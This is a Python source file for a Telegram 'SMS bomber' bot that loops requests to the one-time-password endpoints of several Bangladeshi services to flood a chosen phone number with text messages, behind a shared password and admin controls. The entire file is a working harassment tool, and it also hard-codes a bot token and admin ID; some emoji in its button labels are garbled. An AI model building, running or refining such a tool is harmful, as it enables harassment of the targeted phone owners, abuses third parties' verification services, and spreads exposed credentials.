import os
import time
import threading
import requests
import json
import asyncio
from flask import Flask
from threading import Thread
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- WEB SERVER (For 24/7 Hosting) ---
app = Flask('')

@app.route('/')
def home():
    return "SMS Bomber Bot is Online!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

# --- CONFIGURATION ---
BOT_TOKEN = "8563206743:AAF7f_5ylywBTh6O2IuFzXFabnD-_X0x46U"
PASSWORD = "RLSMS"
FILES = {
    "auth": "authenticated_users.json",
    "ban": "banned_users.json",
    "admin": "admin_users.json"
}
ADMIN_IDS = [7127437250]

# Memory Storage
user_states = {}
bombing_threads = {}
counter = {}
counter_lock = threading.Lock()

# --- DATA MANAGEMENT ---
def load_data(file_key):
    try:
        if os.path.exists(FILES[file_key]):
            with open(FILES[file_key], 'r') as f:
                return set(json.load(f).get('users', []))
    except: pass
    return set()

def save_data(file_key, user_id, add=True):
    try:
        data = load_data(file_key)
        if add: data.add(user_id)
        else: data.discard(user_id)
        with open(FILES[file_key], 'w') as f:
            json.dump({'users': list(data)}, f)
    except: pass

# --- KEYBOARDS ---
def get_main_keyboard():
    return ReplyKeyboardMarkup([
        [KeyboardButton("� Start Bombing")],
        [KeyboardButton("📊 My Status"), KeyboardButton("� Stop Bombing")],
        [KeyboardButton("� Stats"), KeyboardButton("🏠 Main Menu")]
    ], resize_keyboard=True)

def get_admin_keyboard():
    return ReplyKeyboardMarkup([
        [KeyboardButton("� Users"), KeyboardButton("📊 Admin Stats")],
        [KeyboardButton("� Broadcast"), KeyboardButton("� Ban User")],
        [KeyboardButton("🏠 Main Menu")]
    ], resize_keyboard=True)

# --- SMS APIs ---
def send_sms(phone, user_id):
    full = f"880{phone[1:]}"
    headers = {'User-Agent': 'Mozilla/5.0'}
    
    apis = [
        f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn={full}",
        ("https://fundesh.com.bd/api/auth/generateOTP", {"phone": phone}),
        ("https://api.osudpotro.com/api/v1/users/send_otp", {"phone": phone}),
        ("https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", {"mobile": phone}),
        ("https://api.apex4u.com/api/auth/login", {"phone": phone})
    ]

    for api in apis:
        try:
            if isinstance(api, str): requests.get(api, headers=headers, timeout=5)
            else: requests.post(api[0], json=api[1], headers=headers, timeout=5)
            with counter_lock:
                counter[user_id] = counter.get(user_id, 0) + 1
        except: pass

# --- BOMBING LOGIC ---
def bombing_task(phone, user_id, context, loop):
    counter[user_id] = 0
    last_sent_count = 0
    
    while user_id in bombing_threads and not bombing_threads[user_id]['stop']:
        send_sms(phone, user_id)
        current_count = counter.get(user_id, 0)
        
        if current_count - last_sent_count >= 10:
            last_sent_count = current_count
            asyncio.run_coroutine_threadsafe(
                context.bot.send_message(chat_id=user_id, text=f"� Progress: {current_count} SMS Sent"),
                loop
            )
        time.sleep(1)

# --- COMMANDS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in load_data("ban"):
        return await update.message.reply_text("🚫 You are banned from this bot.")

    if user_id in ADMIN_IDS or user_id in load_data("admin"):
        return await update.message.reply_text("� Welcome Admin!", reply_markup=get_admin_keyboard())

    if user_id in load_data("auth"):
        user_states[user_id] = "auth"
        return await update.message.reply_text("✅ Welcome back! Choose an option:", reply_markup=get_main_keyboard())

    user_states[user_id] = "wait_pw"
    await update.message.reply_text("🔐 Password Protected!\nPlease enter the password to continue:")

async def handle_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    if user_states.get(user_id) == "wait_pw":
        if text == PASSWORD:
            user_states[user_id] = "auth"
            save_data("auth", user_id)
            await update.message.reply_text("✅ Access Granted!", reply_markup=get_main_keyboard())
        else:
            await update.message.reply_text("❌ Wrong Password! Try again.")
        return

    if user_states.get(user_id) != "auth": return

    if text == "💣 Start Bombing":
        await update.message.reply_text("� Enter target number:\nExample: `017XXXXXXXX`", parse_mode='Markdown')
        user_states[user_id] = "wait_num"
    
    elif user_states.get(user_id) == "wait_num":
        if len(text) == 11 and text.startswith("01"):
            if user_id in bombing_threads: return await update.message.reply_text("⚠️ Already running!")
            
            bombing_threads[user_id] = {'stop': False}
            thread = Thread(target=bombing_task, args=(text, user_id, context, asyncio.get_event_loop()))
            thread.start()
            
            await update.message.reply_text(f"🚀 Bombing started on {text}!", reply_markup=get_main_keyboard())
            user_states[user_id] = "auth"
        else:
            await update.message.reply_text("❌ Invalid Number! Use 11 digits.")

    elif text == "🛑 Stop Bombing":
        if user_id in bombing_threads:
            bombing_threads[user_id]['stop'] = True
            total = counter.get(user_id, 0)
            del bombing_threads[user_id]
            await update.message.reply_text(f"🛑 Stopped! Total sent: {total}")
        else:
            await update.message.reply_text("ℹ️ No active session.")

    elif text == "📊 My Status":
        status = "Running 🚀" if user_id in bombing_threads else "Idle 😴"
        await update.message.reply_text(f"📊 Your Status:\n\nSMS Sent: {counter.get(user_id, 0)}\nStatus: {status}")

    elif text == "📈 Stats":
        total_all = sum(counter.values())
        await update.message.reply_text(f"📈 Global Stats:\n\nTotal SMS Sent: {total_all}")

    elif text == "� Main Menu":
        await start(update, context)

# --- MAIN ---
def main():
    keep_alive()
    app_bot = Application.builder().token(BOT_TOKEN).build()
    
    app_bot.add_handler(CommandHandler("start", start))
    app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_msg))
    
    print("✅ SMS Bot Cleaned & Started!")
    app_bot.run_polling()

if __name__ == "__main__":
    main()
